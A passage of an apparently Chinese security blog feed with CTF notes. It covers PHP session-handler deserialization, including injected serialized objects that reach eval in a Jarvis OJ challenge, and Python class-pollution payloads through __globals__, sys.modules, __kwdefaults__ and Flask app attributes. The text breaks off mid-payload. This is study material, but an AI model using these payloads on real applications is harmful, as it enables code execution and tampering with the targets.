class="hljs-variable language_">$this</span>-&gt;username == <span class="hljs-string">&#x27;admin&#x27;</span>) &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;yes&quot;</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;nonono!&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br>exp.php<br><span class="hljs-meta">&lt;?php</span><br>Class demo&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>=<span class="hljs-string">&#x27;admin&#x27;</span>;<br>    &#125;<br>&#125;<br><span class="hljs-variable">$obj</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">demo</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;|&#x27;</span>.<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$obj</span>);<br><span class="hljs-comment">//|O:4:&quot;demo&quot;:1:&#123;s:8:&quot;username&quot;;s:5:&quot;admin&quot;;&#125;</span><br><span class="hljs-comment">// 存储：a:1:&#123;s:8:&quot;username&quot;;s:43:&quot;|O:4:&quot;demo&quot;:1:&#123;s:8:&quot;username&quot;;s:5:&quot;admin&quot;;&#125;&quot;;&#125;</span><br><span class="hljs-comment">// 如果是php存储：username|s:43:&quot;|O:4:&quot;demo&quot;:1:&#123;s:8:&quot;username&quot;;s:5:&quot;admin&quot;;&#125;&quot;;</span><br><span class="hljs-comment">//// 没有|：username|s:42:&quot;O:4:&quot;demo&quot;:1:&#123;s:8:&quot;username&quot;;s:5:&quot;admin&quot;;&#125;&quot;;，这就就不能触发发序列化</span><br><span class="hljs-comment">// 在使用php引擎解析的的时候，php会以a:1:&#123;s:8:&quot;username&quot;;s:43:&quot;为key，O:4:&quot;demo&quot;:1:&#123;s:8:&quot;username&quot;;s:5:&quot;admin&quot;;&#125;&quot;;&#125;为value，然后对value进行反序列化</span><br><br><span class="hljs-comment">// 需要注意的是会话ID要相同</span><br></code></pre></td></tr></table></figure></li></ul><h4 id="SESSION上传进度"><a href="#SESSION上传进度" class="headerlink" title="SESSION上传进度"></a>SESSION上传进度</h4><ul><li>当<code>session.upload_progress.enabled INI</code>选项开启时，PHP 能够在每一个文件上传时监测上传进度</li><li>这个信息对上传请求自身并没有什么帮助，但在文件上传时应用可以发送一个POST请求到终端（例如通过XHR）来检查这个状态</li><li>当一个上传在处理中，同时POST一个与&#x3D;&#x3D;INI&#x3D;&#x3D;中设置的<code>session.upload_progress.name</code>同名变量时，上传进度可以在<code>$_SESSION</code>中获得。 </li><li>当PHP检测到这种POST请求时，它会在<code>$_SESSION</code>中添加一组数据, 索引是<code>session.upload_progress.prefix</code>与<code> session.upload_progress.name</code>连接在一起的值</li><li>因此，可以通过POST方法来构造数据传入<code>$_SSEION</code><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs html">```<br><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;http://web.jarvisoj.com:32784/index.php&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;POST&quot;</span> <span class="hljs-attr">enctype</span>=<span class="hljs-string">&quot;multipart/form-data&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;123&quot;</span> /&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;file&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;file&quot;</span> /&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> /&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">#### 题目：Jarvisoj Web</span><br>- 默认为php_serialize而index.php中又使用了php，反序列化和序列化使用的处理器不同，由于格式的原因会导致数据无法正确反序列化，那么就可以通过构造伪造任意数据<br>- 源代码<br>```php<br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">//A webshell is wait for you</span><br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&#x27;session.serialize_handler&#x27;</span>, <span class="hljs-string">&#x27;php&#x27;</span>);<br><span class="hljs-title function_ invoke__">session_start</span>();<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">OowoO</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$mdzz</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;mdzz = <span class="hljs-string">&#x27;phpinfo();&#x27;</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable language_">$this</span>-&gt;mdzz);<br>    &#125;<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;phpinfo&#x27;</span>]))<br>&#123;<br>    <span class="hljs-variable">$m</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">OowoO</span>();<br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_string</span>(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;sessiontest.php&#x27;</span>));<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure></li><li>构造字符串获得路径<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">OowoO</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$mdzz</span>=<span class="hljs-string">&#x27;print_r(dirname(__FILE__));&#x27;</span>;<br>&#125;<br><span class="hljs-variable">$obj</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">OowoO</span>();<br><span class="hljs-variable">$a</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$obj</span>);<br><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$a</span>);<br></code></pre></td></tr></table></figure></li><li>然后改为：<code>|O:5:\&quot;OowoO\&quot;:1:&#123;s:4:\&quot;mdzz\&quot;;s:27:\&quot;print_r(dirname(__FILE__));\&quot;;&#125;</code></li><li>没有调用创造函数的原因是此时使用php处理引擎</li><li>查文件：<code>|O:5:\&quot;OowoO\&quot;:1:&#123;s:4:\&quot;mdzz\&quot;;s:36:\&quot;print_r(scandir(dirname(__FILE__)));\&quot;;&#125;</code></li><li>分析借鉴：<ul><li><a href="https://blog.csdn.net/dyw_666666/article/details/89371741">Jarvis-OJ WEB 多题writeup-CSDN博客</a></li></ul></li></ul><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs lua">&lt;form action=<span class="hljs-string">&quot;upload.php&quot;</span> method=<span class="hljs-string">&quot;POST&quot;</span> enctype=<span class="hljs-string">&quot;multipart/form-data&quot;</span>&gt;<br>&lt;<span class="hljs-built_in">input</span> <span class="hljs-built_in">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> name=<span class="hljs-string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span> value=<span class="hljs-string">&quot;ryat&quot;</span> /&gt;<br>&lt;<span class="hljs-built_in">input</span> <span class="hljs-built_in">type</span>=<span class="hljs-string">&quot;file&quot;</span> name=<span class="hljs-string">&quot;file&quot;</span> /&gt;<br>&lt;<span class="hljs-built_in">input</span> <span class="hljs-built_in">type</span>=<span class="hljs-string">&quot;submit&quot;</span> /&gt;<br>&lt;/form&gt;<br></code></pre></td></tr></table></figure><p>The key of stored in the session will look like this:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&quot;upload_progress_ryat&quot;</span>]<br></code></pre></td></tr></table></figure><p><code>ryat</code>的部分可以注入自己的代码，如<code>ryat|序列化字符串</code></p>]]></content>
    
    
    <categories>
      
      <category>uncategorized</category>
      
    </categories>
    
    
    <tags>
      
      <tag>PHP</tag>
      
      <tag>session</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>原型链-1</title>
    <link href="/2025/10/16/%E5%8E%9F%E5%9E%8B%E9%93%BE-1/"/>
    <url>/2025/10/16/%E5%8E%9F%E5%9E%8B%E9%93%BE-1/</url>
    
    <content type="html"><![CDATA[<h3 id="简析"><a href="#简析" class="headerlink" title="简析"></a>简析</h3><ul><li>根本原理和Nodejs原型链污染的根本原理相同，只不过<code>Nodejs</code>是<em><strong>对键值对的控制</strong></em>来进行污染，而<code>python</code>则是<em><strong>对类属性值的污染</strong></em>，且<strong>只能对类的属性进行污染</strong>而<strong>不能污染类的方法</strong></li></ul><h4 id="示例分析"><a href="#示例分析" class="headerlink" title="示例分析"></a>示例分析</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">merge</span>(<span class="hljs-params">src,dst</span>):<br><span class="hljs-keyword">for</span> k,v <span class="hljs-keyword">in</span> src.items():<span class="hljs-comment"># 提取键值。为什么要items()？因为直接src只能得到键，而不能得到值，for k, v in ... 这种语法是 Python 的序列解包 (Sequence Unpacking)。它期望 `in` 后面的对象每次迭代时都能提供一个包含两个元素的序列（比如元组或列表）。</span><br><span class="hljs-comment"># 因此，`(键, 值)` 这种元组形式恰好能被 `k, v` 完美地解包，`k` 对应键，`v` 对应值</span><br><span class="hljs-keyword">if</span> <span class="hljs-built_in">hasattr</span>(dst,<span class="hljs-string">&#x27;__getitem__&#x27;</span>):<br><span class="hljs-comment"># hasattr(object,name):判断对象是否包含对应的属性。这里是在检查 dst 是否定义了 __getitem__ 方法，检查其是否支持通过[]来访问成员</span><br><span class="hljs-keyword">if</span> dst.get(k) <span class="hljs-keyword">and</span> <span class="hljs-built_in">type</span>(v) == <span class="hljs-built_in">dict</span>:<span class="hljs-comment"># 如果存在dst中k键且v为字典</span><br>merge(v,dst.get(k))<span class="hljs-comment"># 递归调用 merge ，将src中的子字典合并到dst对应的子字典(dst.get(k))中</span><br><span class="hljs-keyword">else</span>:<br>dst[k] = v <span class="hljs-comment"># 赋值或覆盖</span><br><span class="hljs-keyword">elif</span> <span class="hljs-built_in">hasattr</span>(dst,k) <span class="hljs-keyword">and</span> <span class="hljs-built_in">type</span>(v) == <span class="hljs-built_in">dict</span>:<br>merge(v,<span class="hljs-built_in">getattr</span>(dst,k))<span class="hljs-comment"># 为什么不能给k键直接赋值一个字典呢？这是为了实现深层合并而不是浅层覆盖，从而避免丢失嵌套的有效信息。而且如果是直接赋值的话肯定就污染不了了。比如同名字典中还有其它键，直接复制就会被覆盖了</span><br><span class="hljs-keyword">else</span>:<br><span class="hljs-built_in">setattr</span>(dst,k,v)<br></code></pre></td></tr></table></figure><h4 id="污染示例"><a href="#污染示例" class="headerlink" title="污染示例"></a>污染示例</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">father</span>:<br>    secret = <span class="hljs-string">&quot;hello&quot;</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">son_a</span>(<span class="hljs-title class_ inherited__">father</span>):<br>    <span class="hljs-keyword">pass</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">son_b</span>(<span class="hljs-title class_ inherited__">father</span>):<br>    <span class="hljs-keyword">pass</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">merge</span>(<span class="hljs-params">src, dst</span>):<br>    <span class="hljs-keyword">for</span> k, v <span class="hljs-keyword">in</span> src.items():<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">hasattr</span>(dst, <span class="hljs-string">&#x27;__getitem__&#x27;</span>):<br>            <span class="hljs-keyword">if</span> dst.get(k) <span class="hljs-keyword">and</span> <span class="hljs-built_in">type</span>(v) == <span class="hljs-built_in">dict</span>:<br>                merge(v, dst.get(k))<br>            <span class="hljs-keyword">else</span>:<br>                dst[k] = v<br>        <span class="hljs-keyword">elif</span> <span class="hljs-built_in">hasattr</span>(dst, k) <span class="hljs-keyword">and</span> <span class="hljs-built_in">type</span>(v) == <span class="hljs-built_in">dict</span>:<br>            merge(v, <span class="hljs-built_in">getattr</span>(dst, k))<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">setattr</span>(dst, k, v)<br>instance = son_b()<br>payload = &#123;<br>    <span class="hljs-string">&quot;__class__&quot;</span> : &#123;<span class="hljs-comment"># 指向该实例的原型对象</span><br>        <span class="hljs-string">&quot;__base__&quot;</span> : &#123;<span class="hljs-comment"># 父类</span><br>            <span class="hljs-string">&quot;secret&quot;</span> : <span class="hljs-string">&quot;world&quot;</span><br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-built_in">print</span>(son_a.secret)<br><span class="hljs-comment">#hello</span><br><span class="hljs-built_in">print</span>(instance.secret)<br><span class="hljs-comment">#hello</span><br>merge(payload, instance)<br><span class="hljs-built_in">print</span>(son_a.secret)<br><span class="hljs-comment">#world</span><br><span class="hljs-built_in">print</span>(instance.secret)<br><span class="hljs-comment">#world</span><br><br>POST提交<br>Content-<span class="hljs-type">Type</span>: application/json<br></code></pre></td></tr></table></figure><h3 id="获取全局变量污染"><a href="#获取全局变量污染" class="headerlink" title="获取全局变量污染"></a>获取全局变量污染</h3><ul><li><code>__init__</code>作为一个类的内置方法，在<strong>没有被重写为函数</strong>的时候，其<em>数据类型</em>会被当作<em><strong>装饰器</strong></em></li><li><em><strong>装饰器的特点</strong></em>：<em><strong>都</strong></em>具有一个<strong>全局属性</strong><code>__globals__</code><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs python">a=<span class="hljs-number">1</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">merge</span>(<span class="hljs-params">src, dst</span>):<br>    <span class="hljs-keyword">for</span> k, v <span class="hljs-keyword">in</span> src.items():<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">hasattr</span>(dst, <span class="hljs-string">&#x27;__getitem__&#x27;</span>):<br>            <span class="hljs-keyword">if</span> dst.get(k) <span class="hljs-keyword">and</span> <span class="hljs-built_in">type</span>(v) == <span class="hljs-built_in">dict</span>:<br>                merge(v, dst.get(k))<br>            <span class="hljs-keyword">else</span>:<br>                dst[k] = v<br>        <span class="hljs-keyword">elif</span> <span class="hljs-built_in">hasattr</span>(dst, k) <span class="hljs-keyword">and</span> <span class="hljs-built_in">type</span>(v) == <span class="hljs-built_in">dict</span>:<br>            merge(v, <span class="hljs-built_in">getattr</span>(dst, k))<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">setattr</span>(dst, k, v)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">demo</span>():<br>    <span class="hljs-keyword">pass</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">A</span> :<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">pass</span><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">B</span>:<br>name = <span class="hljs-number">2</span><br><span class="hljs-built_in">print</span>(demo.__globals__)<br><span class="hljs-comment"># 等同于 </span><br><span class="hljs-built_in">globals</span>() <br><span class="hljs-comment"># 等同于</span><br>A.__init__.__globals__<br>instance = A()<br>payload = &#123;<br>    <span class="hljs-string">&quot;__init__&quot;</span>:&#123;<br>        <span class="hljs-string">&quot;__globals__&quot;</span>:&#123;<br>            <span class="hljs-string">&quot;a&quot;</span>:<span class="hljs-number">4</span>,<br>            <span class="hljs-string">&quot;B&quot;</span>:&#123;<span class="hljs-comment"># 声明的类也是一个全局属性</span><br>                <span class="hljs-string">&quot;name&quot;</span>:<span class="hljs-number">5</span><br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-built_in">print</span>(B.name)<br><span class="hljs-built_in">print</span>(a)<br>merge(payload, instance)<br><span class="hljs-built_in">print</span>(B.name)<br><span class="hljs-built_in">print</span>(a)<br><br></code></pre></td></tr></table></figure></li></ul><h3 id="污染加载的其它模块"><a href="#污染加载的其它模块" class="headerlink" title="污染加载的其它模块"></a>污染加载的其它模块</h3><ul><li>在可以操控全局变量的情况下，我们能对入口文件的<em><strong>类对象或属性</strong></em>进行操作</li><li>如果目标对象不在入口文件中，就需要对其它加载过的模块来获取了</li></ul><h4 id="import加载污染"><a href="#import加载污染" class="headerlink" title="import加载污染"></a>import加载污染</h4><ul><li><code>import</code>入口文件同级下的目录<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> demo<br>payload = &#123;<br>    <span class="hljs-string">&quot;__init__&quot;</span>:&#123;<br>        <span class="hljs-string">&quot;__globals__&quot;</span>:&#123;<br>            <span class="hljs-string">&quot;demo&quot;</span>:&#123;<br>                <span class="hljs-string">&quot;a&quot;</span>:<span class="hljs-number">4</span>,<br>                <span class="hljs-string">&quot;B&quot;</span>:&#123;<br>                    <span class="hljs-string">&quot;classa&quot;</span>:<span class="hljs-number">5</span><br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">##demo.py</span><br>a = <span class="hljs-number">1</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">B</span>:<br>    classa = <span class="hljs-number">2</span><br></code></pre></td></tr></table></figure></li></ul><h4 id="sys加载污染"><a href="#sys加载污染" class="headerlink" title="sys加载污染"></a>sys加载污染</h4><ul><li>引用第三方模块或内置模块的环境</li><li>这时候就要借助<code>sys</code>模块中的<code>module</code>属性<ul><li>该属性能加载出<em><strong>自运行开始所有已加载的模块</strong></em><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> sys<br>payload = &#123;<br>    <span class="hljs-string">&quot;__init__&quot;</span>:&#123;<br>        <span class="hljs-string">&quot;__globals__&quot;</span>:&#123;<br>            <span class="hljs-string">&quot;sys&quot;</span>:&#123;<br>                <span class="hljs-string">&quot;modules&quot;</span>:&#123;<br>                    <span class="hljs-string">&quot;demo&quot;</span>:&#123;<br>                        <span class="hljs-string">&quot;a&quot;</span>:<span class="hljs-number">4</span>,<br>                        <span class="hljs-string">&quot;B&quot;</span>:&#123;<br>                            <span class="hljs-string">&quot;classa&quot;</span>:<span class="hljs-number">5</span><br>                        &#125;<br>                    &#125;<br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li></ul></li></ul><h4 id="加载器loader污染"><a href="#加载器loader污染" class="headerlink" title="加载器loader污染"></a>加载器loader污染</h4><ul><li><code>sys</code>模块不是都有导入的，这时候就能借助<code>loader</code></li><li><code>loader</code>加载器是python为了<strong>实现模块加载</strong>而设计的类，其在<code>importlilb</code>这一内置模块中有具体实现</li><li>且<code>importlib</code>模块下的所有<code>py</code>文件都引入了<code>sys</code>模块</li><li>这样就能通过<code>&lt;模块名&gt;.__loader__.__init__.__globals__[&#39;sys&#39;]</code>来获取<code>sys</code>模块<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> math<br><span class="hljs-comment"># 获取模块的loader</span><br>loader = math.__loader__<br><span class="hljs-comment"># 即 math 模块的 __loader__ 属性包含了一个 loader 对象，负责加载 math 模块</span><br><span class="hljs-comment"># 打印loader信息</span><br><span class="hljs-built_in">print</span>(loader)<br></code></pre></td></tr></table></figure></li></ul><h4 id="spec-污染"><a href="#spec-污染" class="headerlink" title="__spec__污染"></a><code>__spec__</code>污染</h4><ul><li>其包含了关于类加载时候的信息，定义在<code>Lib/importlib/_bootstrap.py</code>的类<code>ModuleSpec</code>中</li><li>因此可以以<code>&lt;模块名&gt;.__spec__.__init__.__globals__[&#39;sys&#39;]</code>来获取<code>sys</code>模块</li></ul><h3 id="函数形参默认值替换"><a href="#函数形参默认值替换" class="headerlink" title="函数形参默认值替换"></a>函数形参默认值替换</h3><ul><li><code>__defaults__</code>：python中的一个内置元组，用于存储<strong>方法形参的默认参数值</strong><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">a</span>(<span class="hljs-params">var_1, var_2 =<span class="hljs-number">2</span>, var_3 = <span class="hljs-number">3</span></span>):<br>    <span class="hljs-keyword">pass</span><br><span class="hljs-built_in">print</span>(a.__defaults__)<br><span class="hljs-comment">#(2, 3)</span><br></code></pre></td></tr></table></figure></li><li>因此可以通过替换该属性，来实现对函数位置或者是键值默认值替换，但是前提条件是我们要替换的值是元组的形式：&#96;<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python">payload = &#123;<br>    <span class="hljs-string">&quot;__init__&quot;</span> : &#123;<br>        <span class="hljs-string">&quot;__globals__&quot;</span> : &#123;<br>            <span class="hljs-string">&quot;demo&quot;</span> : &#123;<br>                <span class="hljs-string">&quot;__defaults__&quot;</span> : (<span class="hljs-literal">True</span>,)<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure></li><li><code>__kwdefaults__</code>是以字典形式来进行收录：<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python">payload = &#123;<br>    <span class="hljs-string">&quot;__init__&quot;</span> : &#123;<br>        <span class="hljs-string">&quot;__globals__&quot;</span> : &#123;<br>            <span class="hljs-string">&quot;demo&quot;</span> : &#123;<br>                <span class="hljs-string">&quot;__kwdefaults__&quot;</span> : &#123;<br>                    <span class="hljs-string">&quot;shell&quot;</span> : <span class="hljs-literal">True</span><br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li></ul><h3 id="flask的app关键属性"><a href="#flask的app关键属性" class="headerlink" title="flask的app关键属性"></a>flask的app关键属性</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs python">app = Flask(__name__)<br><br><span class="hljs-comment"># _got_first_request:判断某次请求是否为flask启动后的第一次请求，返回布尔值，会影响装饰器:</span><br><span class="hljs-comment">## app.before_first_request 的调用</span><br>payload=&#123;<br>    <span class="hljs-string">&quot;__init__&quot;</span>:&#123;<br>        <span class="hljs-string">&quot;__globals__&quot;</span>:&#123;<br>            <span class="hljs-string">&quot;app&quot;</span>:&#123;<br>                <span class="hljs-string">&quot;_got_first_request&quot;</span>:<span class="hljs-literal">False</span><br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-comment"># _static_url_path:被指定的static静态目录路径，污染后可实现重定向以获取其它文件下的信息</span><br>payload=&#123;<br>    <span 